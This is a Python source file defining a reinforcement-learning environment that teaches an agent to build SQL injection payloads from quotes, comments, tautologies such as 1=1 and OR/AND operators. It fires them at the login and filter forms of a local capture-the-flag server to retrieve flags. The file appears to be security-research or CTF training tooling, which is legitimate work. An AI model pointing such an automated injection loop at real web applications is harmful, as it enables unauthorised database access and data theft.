import logging
import os
import re
import time

import gymnasium as gym
import numpy as np
import requests
from dotenv import load_dotenv
from gymnasium import spaces
from requests.adapters import HTTPAdapter
from stable_baselines3.common.monitor import Monitor
from urllib3 import Retry

# Load environment variables from .env file
load_dotenv()

NUM_CHALLENGES = int(os.getenv('NUM_CHALLENGES', 1))  # Default to 1 if not set

# Define tokens with more specific SQL elements for better grammar adherence
tokens = {
    "escape_chars": ["'", '"', ""],
    "comments": ["--", "#", "/*"],
    "functions": ["OFFSET", "LIMIT"],
    "special_chars": [")", "(", " "],
    "tautologies": ["1=1", "1=0"],
    "ints": ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],
    "operators": ["AND", "OR"],
}


class SQLiEnv(gym.Env):
    def __init__(self):
        self.base_url = "http://localhost:5959/challenge/"
        self.current_challenge_id = 1
        self.tokens = tokens
        self.last_payload = ""  # Store the last payload
        self.exploit_char_found = False  # Flag for finding exploit character
        self.exploit_char = ""  # Store the found exploit character
        self.step_count = 0  # Track the number of steps in the current episode
        self.max_steps_per_episode = 200000  # Maximum steps per episode

        # Flatten the token list for easy indexing
        self.flat_tokens = [token for category in self.tokens.values() for token in category]
        self.token_count = len(self.flat_tokens)

        # Shape 22, first value is the payload length, the rest are 21 tokens
        self.action_space = spaces.Box(low=0, high=1, shape=(22,), dtype=np.float32)

        # Define the observation space with more granularity
        self.observation_space = spaces.Box(low=0, high=1, shape=(11,), dtype=np.float32)
        # Observation space: [exploit_char_used, exploit_char_beginning, no_multiples_op_in_row,
        # no_multiples_func_in_row, no_multiples_taut_in_row, no_multiples_esc_in_row,
        # no_multiples_int_in_row_wth_space, odd_escape_char_count, query_valid, data_found, flag_found]

        # Set up a session with retries
        self.session = requests.Session()
        retries = Retry(total=5, backoff_factor=0.1)
        self.session.mount("http://", HTTPAdapter(max_retries=retries))

    def step(self, action):
        self.step_count += 1  # Increment step count

        if not self.exploit_char_found:
            # Payload length is fixed to 1 to find the escape character
            payload_tokens = [self.flat_tokens[int(action[1] * (len(self.tokens["escape_chars"]) - 1))]]
        else:
            # Build complex payloads
            payload_length = int(action[0] * 20) + 1  # Scale to get a value between 1 and 20
            payload_tokens = [self.flat_tokens[int(a * self.token_count)] for a in action[1:payload_length]]
            # Ensure the payload always starts with the exploit character
            payload_tokens.insert(0, self.exploit_char)
            # Remove any comment tokens from the middle of the payload
            payload_tokens = [token for token in payload_tokens if token not in self.tokens["comments"]]

            # Always append a comment at the end
            comment_token = self.tokens["comments"][int(action[payload_length] * (len(self.tokens["comments"]) - 1))]
            payload_tokens.append(comment_token)

        payload = ' '.join(payload_tokens)
        self.last_payload = payload

        try:
            response = self.session.get(f"{self.base_url}{self.current_challenge_id}", timeout=30)
            if "Login" in response.text:
                data = {"username_payload": payload, "password_payload": ""}
            elif "Filter" in response.text:
                data = {"payload": payload}

            start_time = time.time()
            response = self.session.post(f"{self.base_url}{self.current_challenge_id}", data=data, timeout=30)
            end_time = time.time()

            state, reward, done, truncated = self.analyze_response(response.text, payload, response.status_code)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            logging.error(f"Connection failed: {e}")
            state, reward, done, truncated = np.zeros(self.observation_space.shape), -1000, False, False

        # Check if episode should be truncated due to reaching the max steps
        if self.step_count >= self.max_steps_per_episode:
            truncated = True

        info = {"response_time": end_time - start_time}

        return np.array(state), reward, done, truncated, info

    def reset(self, **kwargs):
        self.exploit_char_found = False
        self.exploit_char = ""
        self.step_count = 0  # Reset step count for new episode
        if NUM_CHALLENGES > 1:
            self.current_challenge_id = (self.current_challenge_id % NUM_CHALLENGES) + 1
        self.session.get("http://localhost:5959/reset")
        return np.zeros(self.observation_space.shape), {}

    def analyze_response(self, response_text, payload, response_status):
        state, reward = self.set_flags(payload, response_text, response_status)
        done = state == [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]
        truncated = False
        return state, reward, done, truncated

    def set_flags(self, payload, response_text, response_status):
        flag_pattern = rf"flag_{self.current_challenge_id}\{{[^}}]+}}"
        space = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        # Observation space: [exploit_char_used, exploit_char_beginning, no_multiples_op_in_row,
        # no_multiples_func_in_row, no_multiples_taut_in_row, no_multiples_esc_in_row,
        # no_multiples_int_in_row_wth_space, odd_escape_char_count, query_valid, data_found, flag_found]

        if self.exploit_char in payload:
            space[0] = 1  # Exploit character used somewhere in the payload

        if payload.startswith(f"{self.exploit_char} "):
            space[1] = 1  # Exploit character used at the beginning

        payload_tokens = payload.split()
        used_tokens = set()  # Track used tokens for diversity reward

        no_consecutive_invalid_tokens = True
        for i in range(len(payload_tokens) - 1):
            if payload_tokens[i] in self.tokens["operators"] and payload_tokens[i + 1] in self.tokens["operators"]:
                space[2] = 0  # Penalize for consecutive operators
                no_consecutive_invalid_tokens = False
            if payload_tokens[i] in self.tokens["functions"] and payload_tokens[i + 1] in self.tokens["functions"]:
                space[3] = 0  # Penalize for consecutive functions
                no_consecutive_invalid_tokens = False
            if payload_tokens[i] in self.tokens["tautologies"] and payload_tokens[i + 1] in self.tokens["tautologies"]:
                space[4] = 0  # Penalize for consecutive tautologies
                no_consecutive_invalid_tokens = False
            if payload_tokens[i] in self.tokens["escape_chars"] and payload_tokens[i + 1] in self.tokens["escape_chars"]:
                space[5] = 0  # Penalize for consecutive escape characters
                no_consecutive_invalid_tokens = False

            if (payload_tokens[i] == "(" and payload_tokens[i + 1] == ")") or \
                    (payload_tokens[i] == ")" and payload_tokens[i + 1] == "("):
                no_consecutive_invalid_tokens = False  # Penalize empty parentheses

            if (payload_tokens[i] in self.tokens["functions"] and payload_tokens[i + 1] in self.tokens["tautologies"]) or \
                    (payload_tokens[i] in self.tokens["tautologies"] and payload_tokens[i + 1] in self.tokens["ints"]) or \
                    (payload_tokens[i] in self.tokens["ints"] and payload_tokens[i + 1] in self.tokens["tautologies"]):
                no_consecutive_invalid_tokens = False  # Penalize invalid sequences of functions, tautologies, and integers

            used_tokens.add(payload_tokens[i])
        used_tokens.add(payload_tokens[-1])

        if no_consecutive_invalid_tokens:
            space[2] = 1
            space[3] = 1
            space[4] = 1
            space[5] = 1

        # Reward for not using two integers in a row separated by a space
        no_consecutive_integers = True
        for i in range(len(payload_tokens) - 1):
            if payload_tokens[i] in self.tokens["ints"] and payload_tokens[i + 1] in self.tokens["ints"]:
                no_consecutive_integers = False
                break

        if no_consecutive_integers:
            space[6] = 1

        # Check for even number of occurrences of the found exploit character
        exploit_char_count = payload.count(self.exploit_char)
        space[7] = 1 if exploit_char_count % 2 == 1 else 0

        if response_status == 200:
            space[8] = 1  # Query is valid

        elif "flag_" in response_text:
            space[9] = 1  # Data found

        if re.search(flag_pattern, response_text):
            space[9] = 1  # Data found
            space[10] = 1  # Flag found

        reward = self.set_reward(space, payload, used_tokens)
        return space, reward

    def set_reward(self, space, payload, used_tokens):
        reward = 0

        # Observation space: [exploit_char_used, exploit_char_beginning, no_multiples_op_in_row,
        # no_multiples_func_in_row, no_multiples_taut_in_row, no_multiples_esc_in_row,
        # no_multiples_int_in_row_wth_space, odd_escape_char_count, query_valid, data_found, flag_found]

        if space[0] == 0:
            reward -= 1000  # Penalty for not using the exploit character (very bad)

        if space[1] == 0:
            reward -= 75  # Penalty for not using the exploit character at the beginning (bad but still ok)

        if space[2] == 0:
            reward -= 125  # Penalty for using multiple operators in a row (very bad)

        if space[3] == 0:
            reward -= 125  # Penalty for using multiple functions in a row (very bad)

        if space[4] == 0:
            reward -= 125  # Penalty for using multiple tautologies in a row (very bad)

        if space[5] == 0:
            reward -= 125  # Penalty for using multiple escape characters in a row (very bad)

        if space[6] == 0:
            reward -= 125  # Penalty for using multiple integers in a row with a space (very bad)

        # Penalty for using an odd number of occurrences of the exploit character
        if space[7] == 0:
            reward -= 125  # Adjust the penalty value as needed

        if space[8] == 0:
            if not self.exploit_char_found:
                reward -= 20  # Penalty for not finding the exploit character by crashing the server
                self.exploit_char_found = True
                self.exploit_char = payload.split(' ')[0]  # Set the first token as the escape character
                print(f"Exploit character found: {self.exploit_char}")
            else:
                reward -= 50  # Penalty for crashing the server if we already found the exploit character
                # (bad but ok because of the exploration)

        if space[9] == 0:
            reward -= 50  # Penalty for not finding any data (bad)

        if space[10] == 1 and space != [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]:
            reward -= 5  # Small penalty for finding the flag but not in optimal conditions

        # Penalty for overly simplistic payload
        if len(payload.split()) <= 5:  # if payload is too short
            reward -= 125

        # Penalty for lack of diversity in token usage
        if space[9] == 0 and space[10] == 0:
            reward -= (20 - len(used_tokens)) * 5  # Increase penalty for lower diversity

        if space == [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]:
            reward = -1  # High reward for finding the flag

        return reward


env = Monitor(SQLiEnv(), "logs", allow_early_resets=True)
